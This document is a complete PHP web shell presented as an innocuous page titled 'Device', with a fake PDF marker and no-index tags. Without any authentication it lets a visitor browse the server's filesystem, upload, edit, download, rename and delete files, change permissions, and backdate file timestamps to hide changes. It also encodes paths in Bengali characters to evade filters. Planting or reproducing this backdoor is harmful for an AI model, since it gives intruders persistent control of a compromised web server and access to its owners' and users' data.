<!--%PDF-yt--><!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="noindex, nofollow">
    <title>Device</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet"
        integrity="sha384-GLhlTQ8iRABdZLl6O3oVMWSktQOp6b7In1Zl3/Jr59b6EGGoI1aFkw7cmDA6j6gD" crossorigin="anonymous">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css"
        integrity="sha512-SzlrxWUlpfuzQ+pcUCosxcglQRNAq/DZjVsC0lE40xsADsfeQoEypE+enwcOiGjk/bSuGGKHEyjSoQ1zVisanQ=="
        crossorigin="anonymous" referrerpolicy="no-referrer" />
    <style>
        .perm-write { color: green; }
        .perm-read { color: red; }
        .perm-execute { color: blue; }
    </style>
</head>
<body>
    <?php
    function formatSizeUnits($bytes)
    {
        if ($bytes >= 1073741824) {
            $bytes = number_format($bytes / 1073741824, 2) . ' GB';
        } elseif ($bytes >= 1048576) {
            $bytes = number_format($bytes / 1048576, 2) . ' MB';
        } elseif ($bytes >= 1024) {
            $bytes = number_format($bytes / 1024, 2) . ' KB';
        } elseif ($bytes > 1) {
            $bytes = $bytes . ' bytes';
        } elseif ($bytes == 1) {
            $bytes = $bytes . ' byte';
        } else {
            $bytes = '0 bytes';
        }
        return $bytes;
    }

    function fileExtension($file)
    {
        return substr(strrchr($file, '.'), 1);
    }

    function fileIcon($file)
    {
        $imgs = array("apng", "avif", "gif", "jpg", "jpeg", "jfif", "pjpeg", "pjp", "png", "svg", "webp");
        $audio = array("wav", "m4a", "m4b", "mp3", "ogg", "webm", "mpc");
        $ext = strtolower(fileExtension($file));
        if ($file == "error_log") {
            return '<i class="fa-sharp fa-solid fa-bug"></i> ';
        } elseif ($file == ".htaccess") {
            return '<i class="fa-solid fa-hammer"></i> ';
        }
        if ($ext == "html" || $ext == "htm") {
            return '<i class="fa-brands fa-html5"></i> ';
        } elseif ($ext == "php" || $ext == "phtml") {
            return '<i class="fa-brands fa-php"></i> ';
        } elseif (in_array($ext, $imgs)) {
            return '<i class="fa-regular fa-images"></i> ';
        } elseif ($ext == "css") {
            return '<i class="fa-brands fa-css3"></i> ';
        } elseif ($ext == "txt") {
            return '<i class="fa-regular fa-file-lines"></i> ';
        } elseif (in_array($ext, $audio)) {
            return '<i class="fa-duotone fa-file-music"></i> ';
        } elseif ($ext == "py") {
            return '<i class="fa-brands fa-python"></i> ';
        } elseif ($ext == "js") {
            return '<i class="fa-brands fa-js"></i> ';
        } else {
            return '<i class="fa-solid fa-file"></i> ';
        }
    }

    function encodePath($path)
    {
        $a = array("/", "\\", ".", ":");
        $b = array("ক", "খ", "গ", "ঘ");
        return str_replace($a, $b, $path);
    }
    function decodePath($path)
    {
        $a = array("/", "\\", ".", ":");
        $b = array("ক", "খ", "গ", "ঘ");
        return str_replace($b, $a, $path);
    }

    function formatPermissions($perms) {
        $perms = decoct($perms);
        $perms = str_pad($perms, 4, '0', STR_PAD_LEFT);
        $output = '';
        for ($i = 1; $i <= 3; $i++) {
            $part = substr($perms, $i, 1);
            $output .= '<span class="';
            // Owner permissions
            if ($i == 1) {
                $output .= ($part & 4) ? 'perm-read' : '';
                $output .= ($part & 2) ? 'perm-write' : '';
                $output .= ($part & 1) ? 'perm-execute' : '';
            }
            // Group permissions
            elseif ($i == 2) {
                $output .= ($part & 4) ? 'perm-read' : '';
                $output .= ($part & 2) ? 'perm-write' : '';
                $output .= ($part & 1) ? 'perm-execute' : '';
            }
            // World permissions
            elseif ($i == 3) {
                $output .= ($part & 4) ? 'perm-read' : '';
                $output .= ($part & 2) ? 'perm-write' : '';
                $output .= ($part & 1) ? 'perm-execute' : '';
            }
            $output .= '">'.$part.'</span>';
        }
        return $output;
    }

    $root_path = __DIR__;
    if (isset($_GET['p'])) {
        if (empty($_GET['p'])) {
            $p = $root_path;
        } elseif (!is_dir(decodePath($_GET['p']))) {
            echo ("<script>\nalert('Directory is Corrupted and Unreadable.');\nwindow.location.replace('?');\n</script>");
        } elseif (is_dir(decodePath($_GET['p']))) {
            $p = decodePath($_GET['p']);
        }
    } elseif (isset($_GET['q'])) {
        if (!is_dir(decodePath($_GET['q']))) {
            echo ("<script>window.location.replace('?p=');</script>");
        } elseif (is_dir(decodePath($_GET['q']))) {
            $p = decodePath($_GET['q']);
        }
    } else {
        $p = $root_path;
    }
    define("PATH", $p);

    echo ('
<nav class="navbar navbar-light" style="background-color: #e3f2fd;">
  <div class="navbar-brand">
  <a href="?"><img src="https://github.com/fluidicon.png" width="30" height="30" alt=""></a>
');

    $path = str_replace('\\', '/', PATH);
    $paths = explode('/', $path);
    foreach ($paths as $id => $dir_part) {
        if ($dir_part == '' && $id == 0) {
            $a = true;
            echo "<a href=\"?p=/\">/</a>";
            continue;
        }
        if ($dir_part == '')
            continue;
        echo "<a href='?p=";
        for ($i = 0; $i <= $id; $i++) {
            echo str_replace(":", "ঘ", $paths[$i]);
            if ($i != $id)
                echo "ক";
        }
        echo "'>" . $dir_part . "</a>/";
    }
    echo ('
</div>
<div class="form-inline">
<a href="?newfile&q=' . urlencode(encodePath(PATH)) . '"><button class="btn btn-dark" type="button">New File</button></a>
<a href="?newdir&q=' . urlencode(encodePath(PATH)) . '"><button class="btn btn-dark" type="button">New Folder</button></a>
<a href="?upload&q=' . urlencode(encodePath(PATH)) . '"><button class="btn btn-dark" type="button">Upload File</button></a>
<a href="?"><button type="button" class="btn btn-dark">HOME</button></a> 
</div>
</nav>');


    if (isset($_GET['p'])) {

        //fetch files
        if (is_readable(PATH)) {
            $fetch_obj = scandir(PATH);
            $folders = array();
            $files = array();
            foreach ($fetch_obj as $obj) {
                if ($obj == '.' || $obj == '..') {
                    continue;
                }
                $new_obj = PATH . '/' . $obj;
                if (is_dir($new_obj)) {
                    array_push($folders, $obj);
                } elseif (is_file($new_obj)) {
                    array_push($files, $obj);
                }
            }
        }
        echo '
<table class="table table-hover">
  <thead>
    <tr>
      <th scope="col">Name</th>
      <th scope="col">Size</th>
      <th scope="col">Modified</th>
      <th scope="col">Perms</th>
      <th scope="col">Actions</th>
    </tr>
  </thead>
  <tbody>
';
        foreach ($folders as $folder) {
            echo "    <tr>
      <td><i class='fa-solid fa-folder'></i> <a href='?p=" . urlencode(encodePath(PATH . "/" . $folder)) . "'>" . $folder . "</a></td>
      <td><b>---</b></td>
      <td>". date("F d Y H:i:s.", filemtime(PATH . "/" . $folder)) . "</td>
      <td>0" . substr(decoct(fileperms(PATH . "/" . $folder)), -3) . "</a></td>
      <td>
      <a title='Edit Permissions' href='?q=" . urlencode(encodePath(PATH)) . "&chmod=" . $folder . "'><i class='fa-solid fa-lock'></i></a>
      <a title='Change Date' href='?q=" . urlencode(encodePath(PATH)) . "&date=" . $folder . "'><i class='fa-solid fa-calendar'></i></a>
      <a title='Rename' href='?q=" . urlencode(encodePath(PATH)) . "&r=" . $folder . "'><i class='fa-sharp fa-regular fa-pen-to-square'></i></a>
      <a title='Delete' href='?q=" . urlencode(encodePath(PATH)) . "&d=" . $folder . "'><i class='fa fa-trash' aria-hidden='true'></i></a>
      <td>
    </tr>
";
        }
        foreach ($files as $file) {
            echo "    <tr>
          <td>" . fileIcon($file) . $file . "</td>
          <td>" . formatSizeUnits(filesize(PATH . "/" . $file)) . "</td>
          <td>" . date("F d Y H:i:s.", filemtime(PATH . "/" . $file)) . "</td>
          <td>0". substr(decoct(fileperms(PATH . "/" .$file)), -3) . "</a></td>
          <td>
          <a title='Download' href='?q=" . urlencode(encodePath(PATH)) . "&download=" . $file . "'><i class='fa-solid fa-download'></i></a>
          <a title='Edit File' href='?q=" . urlencode(encodePath(PATH)) . "&e=" . $file . "'><i class='fa-solid fa-file-pen'></i></a>
          <a title='Edit Permissions' href='?q=" . urlencode(encodePath(PATH)) . "&chmod=" . $file . "'><i class='fa-solid fa-lock'></i></a>
          <a title='Change Date' href='?q=" . urlencode(encodePath(PATH)) . "&date=" . $file . "'><i class='fa-solid fa-calendar'></i></a>
          <a title='Rename' href='?q=" . urlencode(encodePath(PATH)) . "&r=" . $file . "'><i class='fa-sharp fa-regular fa-pen-to-square'></i></a>
          <a title='Delete' href='?q=" . urlencode(encodePath(PATH)) . "&d=" . $file . "'><i class='fa fa-trash' aria-hidden='true'></i></a>
          <td>
    </tr>
";
        }
        echo "  </tbody>
</table>";
    } else {
        if (empty($_GET)) {
            echo ("<script>window.location.replace('?p=');</script>");
        }
    }

    // New File Form
    if (isset($_GET['newfile'])) {
        echo '
    <form method="post">
        New File Name:
        <input type="text" name="filename" placeholder="filename.ext">
        <input type="submit" class="btn btn-dark" value="Create" name="createfile">
    </form>';
        if (isset($_POST['createfile'])) {
            $filename = PATH . "/" . $_POST['filename'];
            if (file_put_contents($filename, '') !== false) {
                echo ("<script>alert('File created.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
            } else {
                echo ("<script>alert('Error creating file.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
            }
        }
    }

    // New Directory Form
    if (isset($_GET['newdir'])) {
        echo '
    <form method="post">
        New Directory Name:
        <input type="text" name="dirname" placeholder="directory name">
        <input type="submit" class="btn btn-dark" value="Create" name="createdir">
    </form>';
        if (isset($_POST['createdir'])) {
            $dirname = PATH . "/" . $_POST['dirname'];
            if (mkdir($dirname)) {
                echo ("<script>alert('Directory created.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
            } else {
                echo ("<script>alert('Error creating directory.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
            }
        }
    }

    // Upload Form
    if (isset($_GET['upload'])) {
        echo '
    <form method="post" enctype="multipart/form-data">
        Select file to upload:
        <input type="file" name="fileToUpload" id="fileToUpload">
        <input type="submit" class="btn btn-dark" value="Upload" name="upload">
    </form>';
    }

    // Rename Form
    if (isset($_GET['r'])) {
        if (!empty($_GET['r']) && isset($_GET['q'])) {
            echo '
    <form method="post">
        Rename:
        <input type="text" name="name" value="' . $_GET['r'] . '">
        <input type="submit" class="btn btn-dark" value="Rename" name="rename">
    </form>';
            if (isset($_POST['rename'])) {
                $name = PATH . "/" . $_GET['r'];
                if(rename($name, PATH . "/" . $_POST['name'])) {
                    echo ("<script>alert('Renamed.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
                } else {
                    echo ("<script>alert('Some error occurred.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
                }
            }
        }
    }

    // Edit File Form
    if (isset($_GET['e'])) {
        if (!empty($_GET['e']) && isset($_GET['q'])) {
            echo '
    <form method="post">
        <textarea style="height: 500px;
        width: 90%;" name="data">' . htmlspecialchars(file_get_contents(PATH."/".$_GET['e'])) . '</textarea>
        <br>
        <input type="submit" class="btn btn-dark" value="Save" name="edit">
    </form>';

            if(isset($_POST['edit'])) {
                $filename = PATH."/".$_GET['e'];
                $data = $_POST['data'];
                $open = fopen($filename,"w");
                if(fwrite($open,$data)) {
                    echo ("<script>alert('Saved.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
                } else {
                    echo ("<script>alert('Some error occurred.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
                }
                fclose($open);
            }
        }
    }

    // Chmod Form
    if (isset($_GET['chmod'])) {
        if (!empty($_GET['chmod']) && isset($_GET['q'])) {
            $target = PATH . "/" . $_GET['chmod'];
            $current_perms = substr(sprintf('%o', fileperms($target)), -4);
            echo '
    <form method="post">
        Change Permissions for: ' . $_GET['chmod'] . '<br>
        Current permissions: ' . $current_perms . '<br>
        New permissions (octal): 
        <input type="text" name="newperms" value="' . $current_perms . '" placeholder="e.g. 0755">
        <input type="submit" class="btn btn-dark" value="Change" name="changeperms">
    </form>';

            if(isset($_POST['changeperms'])) {
                $newperms = octdec($_POST['newperms']);
                if(chmod($target, $newperms)) {
                    echo ("<script>alert('Permissions changed.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
                } else {
                    echo ("<script>alert('Error changing permissions.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
                }
            }
        }
    }

    // Change Date Form
    if (isset($_GET['date'])) {
        if (!empty($_GET['date']) && isset($_GET['q'])) {
            $target = PATH . "/" . $_GET['date'];
            $current_time = filemtime($target);
            echo '
    <form method="post">
        Change Date/Time for: ' . $_GET['date'] . '<br>
        Current date: ' . date("Y-m-d H:i:s", $current_time) . '<br>
        New date: 
        <input type="datetime-local" name="newdate" value="' . date("Y-m-d\TH:i", $current_time) . '">
        <input type="submit" class="btn btn-dark" value="Change" name="changedate">
    </form>';

            if(isset($_POST['changedate'])) {
                $new_time = strtotime($_POST['newdate']);
                if(touch($target, $new_time)) {
                    echo ("<script>alert('Date changed.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
                } else {
                    echo ("<script>alert('Error changing date.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
                }
            }
        }
    }

    // Download File
    if (isset($_GET['download'])) {
        if (!empty($_GET['download']) && isset($_GET['q'])) {
            $file = PATH . "/" . $_GET['download'];
            if (file_exists($file)) {
                header('Content-Description: File Transfer');
                header('Content-Type: application/octet-stream');
                header('Content-Disposition: attachment; filename="'.basename($file).'"');
                header('Expires: 0');
                header('Cache-Control: must-revalidate');
                header('Pragma: public');
                header('Content-Length: ' . filesize($file));
                readfile($file);
                exit;
            }
        }
    }

    // File Upload Handler
    if (isset($_POST["upload"])) {
        $target_file = PATH . "/" . $_FILES["fileToUpload"]["name"];
        if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
            echo "<p>".htmlspecialchars(basename($_FILES["fileToUpload"]["name"])) . " has been uploaded.</p>";
        } else {
            echo "<p>Sorry, there was an error uploading your file.</p>";
        }
    }

    // Delete Handler
    if (isset($_GET['d']) && isset($_GET['q'])) {
        $name = PATH . "/" . $_GET['d'];
        if (is_file($name)) {
            if(unlink($name)) {
                echo ("<script>alert('File removed.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
            } else {
                echo ("<script>alert('Some error occurred.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
            }
        } elseif (is_dir($name)) {
            if(rmdir($name) == true) {
                echo ("<script>alert('Directory removed.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
            } else {
                echo ("<script>alert('Some error occurred.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
            }
        }
    }
    ?>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"
        integrity="sha384-w76AqPfDkMBDXo30jS1Sgez6pr3x5MlQ1ZAGC+nuZB+EYdgRZgiwxhTBTkF7CXvN"
        crossorigin="anonymous"></script>
</body>
</html>
